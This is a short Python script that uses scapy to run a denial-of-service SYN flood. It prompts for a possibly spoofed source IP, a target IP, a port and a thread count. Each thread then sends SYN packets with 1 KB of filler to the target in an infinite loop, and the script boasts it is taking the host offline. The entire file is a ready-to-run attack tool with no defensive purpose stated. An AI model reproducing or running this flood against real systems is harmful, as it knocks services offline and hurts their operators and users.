import random
import time
import threading
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

print("----------DoS SYN Flood Attack by AlbertL7----------\n")
print("**Port is Randomized from 1024-65635**\n**Base64 nonsense is sent as data**\n")

source = input("Source IP Address:\n[+] ")
destination = input("Destination IP:\n[+] ")
port = int(input("Target Port:\n[+] "))
thread_num = int(input("Number of Threads:\n[+] "))

print(f"[+] Attacking\n[+] {destination}:{port}\n[+] Thread# {thread_num}\n")

def dos_boot():
    print("****Starting DoS Boot****\n")
    src_ip = source
    dest_ip = destination
    src_port = random.randint(1024,65535)
    target_port = port

    ip_packet = IP(src=src_ip, dst=dest_ip)
    tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")
    b64_nonsense = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 16 # equal to 1kb
    tcp_ip_packet = ip_packet / tcp_packet / b64_nonsense
    send(tcp_ip_packet, loop=1, verbose=1)

threads = []

try:
    print(f"****Initializing {thread_num} Threads For SYN Flood****\n****BOOTING {destination} OFF LINE!!!!****\n")
    time.sleep(2)

    for _ in range(thread_num):
        thread = threading.Thread(target=dos_boot)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("Stopping the Attack")
